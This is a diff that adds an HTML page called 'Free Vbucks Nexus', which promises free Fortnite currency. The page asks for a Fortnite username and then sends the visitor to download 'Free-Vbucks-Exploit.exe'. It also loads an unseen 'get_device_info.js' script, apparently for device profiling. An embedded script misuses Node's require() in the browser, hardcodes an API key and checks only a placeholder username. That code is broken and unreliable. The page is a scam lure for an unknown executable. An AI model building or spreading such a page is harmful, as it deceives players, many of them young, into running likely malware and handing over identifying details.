@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🌌 Free Vbucks Nexus</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Orbitron|Exo&display=swap">
+    <script src="get_device_info.js"></script>
+    <style>
+        body {
+            font-family: 'Orbitron', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: #000;
+            color: #00ff9d;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .container {
+            background: #222;
+            border-radius: 16px;
+            padding: 60px;
+            box-shadow: 0 12px 30px rgba(0, 255, 157, 0.5);
+            text-align: center;
+        }
+        
+        .download-link {
+            display: inline-block;
+            padding: 18px 48px;
+            background: linear-gradient(135deg, #00ff9d, #ff00cc);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            text-decoration: none;
+            border-radius: 8px;
+            font-weight: bold;
+            transition: transform 0.4s, background 0.4s;
+            letter-spacing: 3px;
+            border: 2px solid transparent;
+            text-transform: uppercase;
+            font-size: 28px;
+            cursor: pointer;
+        }
+        
+        .download-link:hover {
+            transform: scale(1.08);
+            border: 2px solid #00ff9d;
+        }
+
+        #usernameInput {
+            display: none;
+            margin-top: 30px;
+            animation: fade-in 1s ease-in-out;
+        }
+
+        @keyframes fade-in {
+            0% { opacity: 0; transform: translateY(20px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        input[type="text"] {
+            padding: 14px;
+            width: 100%;
+            font-size: 18px;
+            border: none;
+            background: #222;
+            color: #00ff9d;
+            border-radius: 6px;
+            margin-bottom: 10px;
+            border: 2px solid #00ff9d;
+        }
+
+        button {
+            background: linear-gradient(135deg, #00ff9d, #ff00cc);
+            color: #222;
+            border: none;
+            border-radius: 6px;
+            padding: 14px 28px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: transform 0.3s, background 0.3s;
+        }
+
+        button:hover {
+            transform: scale(1.05);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🌌 Welcome to the Free Vbucks Nexus</h1>
+        <p>Elevate your gaming realm with quantum power!</p>
+        <button class="download-link" onclick="showUsernameInput()">🚀 Initiate Quantum Upgrade</button>
+        <div id="usernameInput">
+            <input type="text" id="fortniteUsername" placeholder="Enter your Fortnite username">
+            <script>
+const axios = require('axios');
+
+// Fortnite API base URL
+const API_BASE_URL = 'https://dash.fortnite-api.com/v2';
+
+// Your API key from the dashboard
+const API_KEY = 'e45ed48b-7db5-40c2-8fc9-4d3627996a5a';
+
+// The username to verify
+const usernameToVerify = 'example_username';
+
+// Construct the request URL
+const requestURL = `${API_BASE_URL}/users/id?username=${usernameToVerify}`;
+
+// Axios configuration
+const axiosConfig = {
+  headers: {
+    'Authorization': `Bearer ${API_KEY}`
+  }
+};
+
+// Make the API request
+axios.get(requestURL, axiosConfig)
+  .then(response => {
+    if (response.status === 200) {
+      const userExists = response.data.data.exists;
+      if (userExists) {
+        console.log(`The username "${usernameToVerify}" exists.`);
+      } else {
+        console.log(`The username "${usernameToVerify}" does not exist.`);
+      }
+    } else {
+      console.log('Error: Unable to fetch data.');
+    }
+  })
+  .catch(error => {
+    console.error('An error occurred:', error.message);
+  });
+
+            </script>
+            <button onclick="downloadExe()">Submit</button>
+        </div>
+    </div>
+    <script>
+        function showUsernameInput() {
+            document.getElementById("usernameInput").style.display = "block";
+        }
+
+        function downloadExe() {
+            var username = document.getElementById("fortniteUsername").value;
+            if (username) {
+                window.location.href = "Free-Vbucks-Exploit.exe"
+            } else {
+                alert("Please enter your Fortnite username.");
+            }
+        }
+    </script>
+</body>
+</html>
